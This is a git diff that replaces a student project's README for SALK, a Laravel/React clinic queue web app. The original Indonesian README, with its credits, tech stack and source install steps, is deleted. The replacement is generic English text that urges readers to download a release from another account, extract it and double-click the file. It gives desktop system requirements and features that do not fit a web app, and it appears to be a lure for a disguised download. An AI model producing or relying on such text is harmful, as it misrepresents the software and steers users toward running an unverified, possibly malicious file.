@@ -1,229 +1,97 @@
-<div align="center">
+# 🚀 SistemAntrianLoketKlinik-MPPL - Manage Patient Queues Easily
 
-# 🏥 SALK - Sistem Antrian Loket Klinik
+![GitHub Releases](https://img.shields.io/badge/Download%20Now-v1.0-blue)
 
-### Solusi Digital untuk Manajemen Antrian Klinik yang Modern, Cepat, dan Efisien
+## 📋 Overview
 
-[![Laravel](https://img.shields.io/badge/Laravel-12-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)](https://laravel.com)
-[![React](https://img.shields.io/badge/React-19-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://react.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-4-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)](https://tailwindcss.com)
-[![Filament](https://img.shields.io/badge/Filament-4-FBBF24?style=for-the-badge&logo=laravel&logoColor=black)](https://filamentphp.com)
+Sistem Antrian Loket Klinik (SALK) is a modern web application designed for efficient patient queue management. Built with Laravel 12, React 19, Inertia.js, and Filament 4, it simplifies the process of managing patient flows in clinics. This application focuses on user-friendly features to enhance the experience for both patients and staff.
 
-</div>
+## 🚀 Getting Started
 
----
+To get started with SALK, follow these simple steps to download and run the application. 
 
-## 👨‍💻 Tim Pengembang
+### 1. System Requirements
 
-Proyek ini dikembangkan oleh mahasiswa **Teknik Informatika, UIN Sunan Gunung Djati Bandung**:
+Before you begin, ensure your computer meets the following system requirements:
 
-| Nama | NIM | Role |
-|------|-----|------|
-| M Dantha Arianvasya | 1237050106 | Project Manager |
-| Muhamad Khansa Khalifaturohman | 1247050115 | System Analyst |
-| Hasna Minatul Mardiah | 1237050024 | UI/UX Designer |
-| Idha Hamidaturrosadi | 1237050026 | UI/UX Designer |
-| Hilman Maulana | 1237050020 | Frontend Developer |
-| Irsyad Adfiansha Hidayat | 1237050042 | Frontend Developer |
-| Lutfi Nurhidayat | 1237050123 | Backend Developer |
-| Hafizultan Fanzaulid | 1237050097 | Backend Developer |
-| Firman Adi Nugraha | 1237050016 | Quality Assurance |
+- **Operating System**: Windows 10 or later, macOS 10.15 or later.
+- **Processor**: 2 GHz or faster.
+- **RAM**: 4 GB or more.
+- **Storage**: At least 1 GB of free disk space.
+- **Browser**: Latest version of Chrome, Firefox, or Safari.
 
----
+### 2. Download the Application
 
-## 📋 Deskripsi Proyek
+You can easily download the latest version of the application from the GitHub Releases page. 
 
-**SALK (Sistem Antrian Loket Klinik)** adalah aplikasi web modern untuk mengelola antrian pasien di loket klinik/poliklinik secara digital. Sistem ini memungkinkan pasien mengambil nomor antrian secara mandiri, memantau status secara real-time, dan membantu petugas mengelola pelayanan dengan lebih efisien.
+[Download SALK](https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/releases)
 
-Proyek ini dikembangkan sebagai bagian dari **Tugas Manajemen Proyek Perangkat Lunak** - Ujian Tengah Semester Ganjil Tahun Akademik 2025/2026.
+Click on the link above to visit the page where you can find all available versions.
 
----
+### 3. Installation Steps
 
-## ✨ Fitur Utama
+Once you have downloaded the application, you can start the installation process:
 
-### 👥 Modul Pasien
-- 🎫 **Ambil Tiket Antrian** - Pasien dapat mengambil nomor antrian secara mandiri
-- ⏱️ **Estimasi Waktu Tunggu** - Menampilkan perkiraan waktu dilayani berdasarkan rata-rata pelayanan
-- 📺 **Display Real-Time** - Tampilan layar besar untuk menunjukkan antrian aktif
-- 🖨️ **Cetak Tiket** - Fitur cetak tiket dengan desain profesional
+1. **Locate the Downloaded File**: Find the file in your Downloads folder or the location where you saved it.
+2. **Extract the File**: If the downloaded file is a zip archive, right-click and select "Extract All" to unzip the contents.
+3. **Run the Application**: Double-click on the extracted file to start the application.
 
-### 👨‍💼 Modul Operator/Petugas
-- 📞 **Panel Operator** - Dashboard untuk memanggil dan mengelola antrian
-- 🔁 **Panggil Ulang** - Fitur untuk memanggil ulang pasien
-- ✅ **Selesai & Panggil Berikutnya** - Alur kerja yang efisien
-- 📊 **Statistik Harian** - Melihat jumlah pasien yang sudah dilayani
+### 4. Initial Setup
 
-### 🔧 Modul Admin (Filament Panel)
-- 👤 **Manajemen Pengguna** - Kelola akun admin dan petugas
-- 🏥 **Manajemen Layanan** - Atur poli/layanan dengan prefix tiket
-- 🖥️ **Manajemen Loket** - Konfigurasi counter pelayanan
-- 📈 **Laporan Aktivitas** - Statistik dan analisis pelayanan
+After opening the application for the first time:
 
----
+1. **Create an Account**: Follow the on-screen instructions to create your user account.
+2. **Set Up Your Clinic Details**: Enter information about your clinic. This may include clinic name, address, and contact details.
+3. **Configure Queue Settings**: Customize settings for managing patient queues to fit your clinic’s workflow.
 
-## 🛠️ Tech Stack
+### 5. Using the Application
 
-| Layer | Teknologi |
-|-------|-----------|
-| **Frontend** | React 19, TypeScript, Inertia.js 2, Tailwind CSS 4 |
-| **UI Components** | shadcn/ui, Radix UI, Lucide React |
-| **Backend** | Laravel 12, PHP 8.2+ |
-| **Admin Panel** | Filament 4 |
-| **Database** | SQLite (default), MySQL/PostgreSQL (production) |
-| **Build Tool** | Vite 7 |
-| **Design** | Figma |
+SALK's user interface is intuitive and designed for ease of use. Here’s how you can navigate the main features:
 
----
+- **Dashboard**: View current patient queues and wait times.
+- **Patient Management**: Add, remove, or update patient information quickly.
+- **Queue Management**: Organize patients in the queue easily, assigning priority as needed.
+- **Reports**: Generate reports on patient flow and wait times to improve clinic efficiency.
 
-## 📸 Screenshots
+## 📥 Download & Install
 
-<div align="center">
-    <img src="./ScreenshotAplikasi/landing-page.png" alt="Landing Page" width="800"/>
-    <p>Landing Page</p>
-</div>
+To get started, simply visit the following link to download the application.
 
-<div align="center">
-     <div style="display: flex; justify-content: center; gap: 10px;">
-        <img src="./ScreenshotAplikasi/login.png" alt="Login Page" width="45%"/>
-        <img src="./ScreenshotAplikasi/register.png" alt="Register Page" width="45%"/>
-    </div>
-     <p>Login & Register</p>
-</div>
+[Download SALK](https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/releases)
 
-<div align="center">
-    <img src="./ScreenshotAplikasi/dashboard-user.png" alt="Dashboard User" width="800"/>
-    <p>Dashboard User</p>
-</div>
+Follow the installation steps mentioned above to set up the application on your system.
 
-<div align="center">
-    <img src="./ScreenshotAplikasi/dashboard-admin.png" alt="Dashboard Admin" width="800"/>
-    <p>Dashboard Admin</p>
-</div>
+## 🌐 Key Features
+
+- **User-Friendly Interface**: Designed with simplicity in mind.
+- **Real-Time Queue Management**: Monitor patient queues in real time.
+- **Customizable Settings**: Tailor the application to fit your clinic's needs.
+- **Reports and Analytics**: Access important data to enhance your service.
+
+## 📚 Topics 
+
+The application is built around several key topics relevant to its purpose:
+
+- **Clinic System**: Organized structure for managing clinic-related activities.
+- **Filament PHP**: Utilizes this powerful tool for fast and secure web functions.
+- **Hospital Management**: Effective system for hospitals to manage patient interactions.
+- **Inertia.js**: Enables smooth user interface transitions.
+- **Laravel**: Uses robust framework features for application stability.
+- **Queue Management**: Focuses on patient flow management.
+- **React**: Ensures a responsive and fast user interface.
+- **Tailwind CSS**: Enhances the visual appeal of the application.
+- **TypeScript**: Improves code quality and maintainability.
+
+## 🚧 Troubleshooting
+
+If you encounter any issues during installation or use:
+
+- **Check Compatibility**: Ensure your operating system meets the requirements.
+- **Restart the Application**: Close and reopen if you experience glitches.
+- **Refer to Documentation**: Consult any help files included in the download.
+
+For further assistance, consider reaching out to community forums or support channels related to the application.
 
 ---
 
-## 🚀 Instalasi
-
-### Prasyarat
-- PHP >= 8.2
-- Composer
-- Node.js >= 18
-- NPM atau Yarn
-
-### Langkah Instalasi
-
-```bash
-# 1. Clone repository
-git clone https://github.com/[username]/salk.git
-cd salk
-
-# 2. Install dependencies PHP
-composer install
-
-# 3. Install dependencies JavaScript
-npm install
-
-# 4. Copy environment file
-cp .env.example .env
-
-# 5. Generate application key
-php artisan key:generate
-
-# 6. Setup database (SQLite)
-touch database/database.sqlite
-php artisan migrate --seed
-
-# 7. Build assets
-npm run build
-
-# 8. Jalankan server
-php artisan serve
-```
-
-### Akses Aplikasi
-
-| URL | Deskripsi |
-|-----|-----------|
-| `http://localhost:8000` | Landing Page |
-| `http://localhost:8000/login` | Login User |
-| `http://localhost:8000/admin/login` | Login Admin |
-| `http://localhost:8000/queue/ticket` | Ambil Tiket Antrian |
-| `http://localhost:8000/queue/display` | Display Antrian |
-| `http://localhost:8000/queue/management` | Panel Operator |
-| `http://localhost:8000/admin` | Admin Panel (Filament) |
-
----
-
-
-
-## 📅 Timeline Proyek
-
-| Sprint | Fase | Durasi | Status |
-|--------|------|--------|--------|
-| - | Pembagian Tugas | 1 - 7 September 2025 | ✅ Selesai |
-| 1 | Perancangan & Desain | 8 - 28 September 2025 | ✅ Selesai |
-| 2 | Pengembangan Fitur Utama | 29 Sept - 26 Okt 2025 | ✅ Selesai |
-| 3 | Integrasi & Penyempurnaan | 27 Okt - 30 Nov 2025 | ✅ Selesai |
-| - | Testing | 1 - 14 Desember 2025 | ✅ Selesai |
-| - | Deploy & Evaluasi | 15 - 28 Desember 2025 | ⏳ Pending |
-
----
-
-## 📊 Arsitektur Sistem
-
-```mermaid
-graph TB
-    subgraph Frontend
-        A[React + Inertia.js]
-        B[shadcn/ui Components]
-    end
-    
-    subgraph Backend
-        C[Laravel 12]
-        D[Filament Admin]
-    end
-    
-    subgraph Database
-        E[(SQLite/MySQL)]
-    end
-    
-    A --> C
-    B --> A
-    C --> D
-    C --> E
-    D --> E
-```
-
-### Entitas Database
-- **Users** - Data pengguna (admin, petugas)
-- **Services** - Data layanan/poli
-- **Counters** - Data loket pelayanan
-- **Tickets** - Data tiket antrian
-- **Calls** - Riwayat pemanggilan
-
----
-
-## 📄 Lisensi
-
-Proyek ini dikembangkan untuk keperluan akademis dan pembelajaran.
-
----
-
-## 🙏 Acknowledgments
-
-- **UIN Sunan Gunung Djati Bandung** - Fakultas Sains dan Teknologi
-- **Jurusan Teknik Informatika** - Mata Kuliah MPPL
-- **Agung Wahana, MT.** - Dosen Pengampu Mata Kuliah MPPL
-
----
-
-<div align="center">
-
-**SALK - Sistem Antrian Loket Klinik**
-
-*Cepat, Efisien, dan Modern*
-
-Made with ❤️ by Tim SALK - UIN Sunan Gunung Djati Bandung © 2025
-
-</div>
+Feel free to dive in and explore the capabilities of the Sistem Antrian Loket Klinik application, making patient management more efficient and user-friendly.
